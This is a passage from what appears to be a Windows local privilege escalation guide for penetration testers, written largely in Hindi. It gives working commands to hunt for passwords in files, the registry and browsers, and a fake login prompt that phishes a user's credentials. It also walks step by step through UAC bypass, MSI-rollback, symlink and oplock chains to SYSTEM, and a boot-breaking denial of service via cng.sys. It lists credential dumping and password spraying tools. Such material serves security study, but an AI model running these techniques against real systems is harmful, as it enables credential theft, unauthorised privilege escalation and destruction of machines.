Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### क्रेडेंशियल्स के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके क्रेडेंशियल्स** या **किसी दूसरे उपयोगकर्ता के क्रेडेंशियल्स** भी दर्ज करने के लिए कह सकते हैं, अगर आपको लगता है कि वह उन्हें जान सकता है (ध्यान दें कि क्लाइंट से सीधे **क्रेडेंशियल्स** के लिए **पूछना** वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Credentials युक्त संभावित filenames**

Known files जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
मैंने सभी प्रस्तावित फाइलें खोज ली हैं:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको अंदर credentials खोजने के लिए Bin भी check करना चाहिए

कई programs द्वारा saved **passwords** को recover करने के लिए आप use कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry के अंदर

**Credentials वाले अन्य possible registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**registry से openssh keys extract करें.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

आपको उन dbs को check करना चाहिए जहाँ **Chrome या Firefox** के passwords store होते हैं।\
साथ ही browsers की history, bookmarks और favourites भी check करें, ताकि शायद वहाँ कुछ **passwords** store हों।

Browsers से passwords extract करने के tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में built-in एक technology है जो अलग-अलग languages के software components के बीच **intercommunication** की अनुमति देती है। हर COM component को **class ID (CLSID)** के जरिए **identify** किया जाता है और हर component एक या अधिक interfaces के जरिए functionality expose करता है, जिन्हें interface IDs (IIDs) से identify किया जाता है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के तहत respectively defined होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** को merge करके बनाई जाती है।

इस registry के CLSIDs के अंदर आपको child registry **InProcServer32** मिल सकती है, जिसमें एक **default value** होती है जो **DLL** की ओर point करती है और **ThreadingModel** नाम की एक value होती है, जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) या **Neutral** (Thread Neutral) हो सकती है।

![](<../../images/image (729).png>)

असल में, अगर आप उन किसी भी **DLLs** को **overwrite** कर सकते हैं जिन्हें execute किया जाने वाला है, तो आप **privileges escalate** कर सकते हैं अगर वह DLL किसी दूसरे user द्वारा execute की जाने वाली हो।

Attackers COM Hijacking को persistence mechanism के रूप में कैसे इस्तेमाल करते हैं, यह जानने के लिए देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**एक निश्चित filename वाली file खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले टूल्स

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है; मैंने यह plugin बनाया है ताकि **victim** के अंदर credentials खोजने वाले हर metasploit POST module को **automatically execute** किया जा सके।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस पेज में बताए गए passwords वाली सभी files को automatically search करता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) system से password निकालने के लिए एक और बढ़िया tool है।

Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **sessions**, **usernames** और **passwords** को several tools के लिए search करता है जो इस data को clear text में save करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, और RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

मान लीजिए कि **SYSTEM के रूप में चल रहा एक process नया process open** (`OpenProcess()`) करता है **full access** के साथ। वही process **एक नया process भी create** (`CreateProcess()`) करता है **low privileges** के साथ, लेकिन main process के सभी open handles inherit करते हुए।\
फिर, अगर आपके पास **low privileged process पर full access** है, तो आप `OpenProcess()` के साथ बनाए गए **privileged process के open handle** को grab कर सकते हैं और **shellcode inject** कर सकते हैं।\
[इस vulnerability को **कैसे detect और exploit करें** इसके बारे में अधिक जानकारी के लिए यह example पढ़ें।](leaked-handle-exploitation.md)\
[**विभिन्न permission levels** (सिर्फ full access नहीं) के साथ processes और threads के more open handlers inherited को test और abuse करने की एक अधिक complete explanation के लिए यह **other post** पढ़ें](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process communication और data transfer को सक्षम बनाते हैं।

Windows एक feature प्रदान करता है जिसे **Named Pipes** कहा जाता है, जो unrelated processes को data share करने देता है, यहाँ तक कि different networks पर भी। यह एक client/server architecture जैसा दिखता है, जिसमें roles को **named pipe server** और **named pipe client** के रूप में परिभाषित किया जाता है।

जब data एक **client** द्वारा pipe के through भेजा जाता है, तो pipe set up करने वाला **server** **client की identity अपनाने** की क्षमता रखता है, यदि उसके पास आवश्यक **SeImpersonate** rights हों। एक **privileged process** की पहचान करना जो एक ऐसी pipe के जरिए communicate करता है जिसे आप mimic कर सकते हैं, उस process की identity adopt करके **higher privileges gain** करने का अवसर देता है, जब वह आपके स्थापित pipe के साथ interact करता है। ऐसे attack को execute करने के निर्देशों के लिए, उपयोगी guides [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिल सकते हैं।

साथ ही, निम्न tool **burp जैसे tool के साथ named pipe communication intercept** करने की अनुमति देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool सभी pipes को list और देखने की अनुमति देता है ताकि privescs ढूँढे जा सकें** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) server mode में `\\pipe\\tapsrv` (MS-TRP) expose करता है। एक remote authenticated client mailslot-based async event path का abuse करके `ClientAttach` को किसी भी existing file, जिसे `NETWORK SERVICE` लिख सकता है, पर arbitrary **4-byte write** में बदल सकता है, फिर Telephony admin rights प्राप्त कर सकता है और service के रूप में एक arbitrary DLL load कर सकता है। Full flow:

- `pszDomainUser` को writable existing path पर set करके `ClientAttach` → service उसे `CreateFileW(..., OPEN_EXISTING)` के through open करता है और async event writes के लिए use करता है।
- हर event attacker-controlled `InitContext` को `Initialize` से उस handle पर write करता है। `LRegisterRequestRecipient` (`Req_Func 61`) के साथ line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) से fetch करें, फिर deterministic writes को repeat करने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` के अंदर खुद को add करें, reconnect करें, फिर arbitrary DLL path के साथ `GetUIDllName` call करें ताकि `TSPI_providerUIIdentify` `NETWORK SERVICE` के रूप में execute हो।

अधिक विवरण:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

पेज **[https://filesec.io/](https://filesec.io/)** देखें

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links जो `ShellExecuteExW` को forward होते हैं, dangerous URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और current user के रूप में attacker-controlled files execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

जब किसी user के रूप में shell मिलता है, तो scheduled tasks या अन्य processes execute हो रहे हो सकते हैं जो **command line पर credentials pass** करते हैं। नीचे दिया गया script हर दो seconds में process command lines capture करता है और current state की तुलना previous state से करता है, और किसी भी difference को output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रक्रियाओं से पासवर्ड चोरी करना

## Low Priv User से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC Bypass

अगर आपके पास graphical interface तक access है (console या RDP के जरिए) और UAC enabled है, तो Microsoft Windows के कुछ versions में unprivileged user से terminal या कोई अन्य process जैसे "NT\AUTHORITY SYSTEM" चलाना possible है।

इससे privileges escalate करना और उसी vulnerability के साथ UAC bypass करना एक ही समय में possible हो जाता है। इसके अलावा, कुछ भी install करने की जरूरत नहीं होती, और process के दौरान इस्तेमाल होने वाला binary Microsoft द्वारा signed और issued होता है।

प्रभावित systems में से कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability का exploit करने के लिए, निम्नलिखित steps करना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium से High Integrity Level / UAC Bypass तक

Integrity Levels के बारे में जानने के लिए यह पढ़ें:

{{#ref}}
integrity-levels.md
{{#endref}}

फिर UAC और UAC bypasses के बारे में जानने के लिए यह पढ़ें:

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

इस तकनीक का वर्णन [**इस blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) में है, और इसका exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह attack मूल रूप से Windows Installer की rollback feature का abuse करके uninstallation process के दौरान legitimate files को malicious files से replace करने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना पड़ता है, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा; बाद में Windows Installer इसे दूसरे MSI packages की uninstallation के दौरान rollback files store करने के लिए इस्तेमाल करेगा, जहाँ rollback files को malicious payload रखने के लिए modified किया जाएगा।

संक्षेप में technique यह है:

1. **Stage 1 – Hijack की तैयारी (`C:\Config.Msi` खाली छोड़ें)**

- Step 1: MSI Install करें
- एक `.msi` बनाएं जो एक harmless file (जैसे `dummy.txt`) को writable folder (`TARGETDIR`) में install करे।
- Installer को **"UAC Compliant"** के रूप में mark करें, ताकि **non-admin user** भी इसे चला सके।
- Install के बाद file पर एक **handle** खुला रखें।

- Step 2: Uninstall शुरू करें
- उसी `.msi` को uninstall करें।
- Uninstall process files को `C:\Config.Msi` में move करना और उन्हें `.rbf` files (rollback backups) के रूप में rename करना शुरू करता है।
- जब file `C:\Config.Msi\<random>.rbf` बन जाए, उसे detect करने के लिए open file handle को `GetFinalPathNameByHandle` से **poll** करें।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है जो:
- जब `.rbf` लिख दी जाए तब signal करता है।
- फिर uninstall जारी रखने से पहले दूसरे event पर **wait** करता है।

- Step 4: `.rbf` की deletion block करें
- Signal मिलने पर, `.rbf` file को `FILE_SHARE_DELETE` के बिना **open** करें — इससे इसे delete होने से **रोका** जाएगा।
- फिर वापस **signal** करें ताकि uninstall finish हो सके।
- Windows Installer `.rbf` delete करने में fail करता है, और क्योंकि वह सारी contents delete नहीं कर पाता, **`C:\Config.Msi` remove नहीं होता**।

- Step 5: `.rbf` को manually delete करें
- आप (attacker) `.rbf` file को manually delete करें।
- अब **`C:\Config.Msi` खाली है**, hijack के लिए तैयार।

> इस बिंदु पर, **SYSTEM-level arbitrary folder delete vulnerability** को trigger करके `C:\Config.Msi` delete करें।

2. **Stage 2 – Rollback Scripts को malicious scripts से replace करना**

- Step 6: Weak ACLs के साथ `C:\Config.Msi` दोबारा बनाएं
- `C:\Config.Msi` folder को खुद recreate करें।
- **weak DACLs** सेट करें (जैसे, Everyone:F), और `WRITE_DAC` के साथ एक **handle open** रखें।

- Step 7: दूसरा Install चलाएं
- `.msi` को फिर से install करें, साथ में:
- `TARGETDIR`: writable location।
- `ERROROUT`: एक variable जो forced failure trigger करता है।
- यह install rollback फिर से trigger करने के लिए इस्तेमाल होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: `.rbs` के लिए monitor करें
- `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` को monitor करें जब तक एक नया `.rbs` दिखाई न दे।
- उसका filename capture करें।

- Step 9: Rollback से पहले Sync करें
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है जो:
- जब `.rbs` create हो जाए तब event signal करता है।
- फिर आगे बढ़ने से पहले **wait** करता है।

- Step 10: Weak ACL दोबारा लागू करें
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs** फिर से लागू करता है।
- लेकिन क्योंकि आपके पास अभी भी `WRITE_DAC` वाला handle है, आप **weak ACLs** फिर से लागू कर सकते हैं।

> ACLs केवल handle open होने पर enforce होती हैं, इसलिए आप folder में अभी भी write कर सकते हैं।

- Step 11: Fake `.rbs` और `.rbf` डालें
- `.rbs` file को एक **fake rollback script** से overwrite करें जो Windows को बताए कि:
- आपकी `.rbf` file (malicious DLL) को एक **privileged location** में restore करे (जैसे, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।
- आपकी fake `.rbf` drop करें जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Rollback trigger करें
- sync event signal करें ताकि installer resume हो।
- एक **type 19 custom action (`ErrorOut`)** को जानबूझकर install को एक ज्ञात point पर fail करने के लिए configured किया गया है।
- इससे **rollback** शुरू होता है।

- Step 13: SYSTEM आपकी DLL install करता है
- Windows Installer:
- आपकी malicious `.rbs` पढ़ता है।
- आपकी `.rbf` DLL को target location में copy करता है।
- अब आपके पास आपकी **malicious DLL एक SYSTEM-loaded path** में है।

- Final Step: SYSTEM Code execute करें
- एक trusted **auto-elevated binary** चलाएं (जैसे, `osk.exe`) जो hijacked DLL को load करता है।
- **Boom**: आपका code **SYSTEM** के रूप में execute होता है।


### Arbitrary File Delete/Move/Rename से SYSTEM EoP तक

मुख्य MSI rollback technique (पिछली वाली) यह assume करती है कि आप एक **पूरे folder** को delete कर सकते हैं (जैसे, `C:\Config.Msi`)। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है तो?

आप **NTFS internals** का exploit कर सकते हैं: हर folder के पास एक hidden alternate data stream होता है called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **index metadata** स्टोर करता है।

इसलिए, अगर आप किसी फ़ोल्डर के **`::$INDEX_ALLOCATION` stream** को **delete** कर देते हैं, तो NTFS **पूरे फ़ोल्डर** को filesystem से हटा देता है।

आप यह standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप एक *file* delete API कॉल कर रहे हों, यह **folder को ही delete** कर देता है।

### Folder Contents Delete से SYSTEM EoP तक
अगर आपका primitive arbitrary files/folders delete करने की अनुमति नहीं देता, लेकिन यह **attacker-controlled folder की *contents* delete** करने की अनुमति देता है, तो क्या होगा?

1. Step 1: एक bait folder और file सेटअप करें
- Create: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- oplock तब **execution pause** करता है जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया ट्रिगर करें (जैसे, `SilentCleanup`)
- यह प्रक्रिया folders को scan करती है (जैसे, `%TEMP%`) और उनकी contents को delete करने की कोशिश करती है।
- जब यह `file1.txt` तक पहुँचती है, तो **oplock ट्रिगर होता है** और control आपके callback को hand off हो जाता है।

4. चरण 4: oplock callback के अंदर – deletion को redirect करें

- Option A: `file1.txt` को कहीं और move करें
- इससे oplock को break किए बिना `folder1` खाली हो जाता है।
- `file1.txt` को directly delete न करें — ऐसा करने से oplock prematurely release हो जाएगा।

- Option B: `folder1` को एक **junction** में convert करें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को target करता है जो folder metadata स्टोर करता है — इसे delete करने पर folder delete हो जाता है।

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटा दिया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

एक primitive का exploit करें जो आपको **SYSTEM/admin के रूप में कोई भी arbitrary folder बनाने** देता है — भले ही **आप files नहीं लिख सकते** या **weak permissions set नहीं कर सकते**।

एक **folder** (file नहीं) बनाएँ, जिसका नाम किसी **critical Windows driver** के नाम पर हो, जैसे:
```
C:\Windows\System32\cng.sys
```
- यह path आम तौर पर `cng.sys` kernel-mode driver से संबंधित होता है।
- अगर आप इसे **पहले से folder के रूप में बना दें**, तो Windows boot पर actual driver load करने में fail हो जाता है।
- फिर Windows boot के दौरान `cng.sys` load करने की कोशिश करता है।
- उसे folder दिखता है, **actual driver resolve करने में fail** होता है, और **crash हो जाता है या boot रुक जाता है**।
- **कोई fallback नहीं** होता, और external intervention के बिना **कोई recovery नहीं** होती (जैसे boot repair या disk access)।

### privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** किसी **writable config** से पढ़े गए path पर logs/exports लिखती है, तो उस path को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहाँ तक कि **SeCreateSymbolicLinkPrivilege** के बिना भी)।

**Requirements**
- target path store करने वाली config attacker के लिए writable होनी चाहिए (जैसे `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point और एक OM file symlink बनाने की ability होनी चाहिए (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- ऐसा privileged operation जो उस path पर लिखता हो (log, export, report)।

**Example chain**
1. config पढ़कर privileged log destination निकालो, जैसे `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`।
2. बिना admin के path redirect करो:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. privileged component के लॉग लिखने का इंतज़ार करें (उदाहरण के लिए, admin "send test SMS" ट्रिगर करता है)। write अब `C:\Windows\System32\cng.sys` में land होता है।
4. overwritten target (hex/PE parser) का निरीक्षण करें ताकि corruption की पुष्टि हो सके; reboot Windows को tampered driver path लोड करने पर मजबूर करता है → **boot loop DoS**। यह किसी भी protected file पर भी लागू होता है जिसे कोई privileged service write के लिए खोलेगा।

> `cng.sys` normally `C:\Windows\System32\drivers\cng.sys` से loaded होता है, लेकिन अगर `C:\Windows\System32\cng.sys` में एक copy मौजूद है तो उसे पहले attempt किया जा सकता है, जिससे यह corrupt data के लिए एक reliable DoS sink बन जाता है।



## **High Integrity से System तक**

### **New service**

अगर आप पहले से High Integrity process पर चल रहे हैं, तो **SYSTEM तक path** आसान हो सकता है, बस **नई service बनाकर और execute करके**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
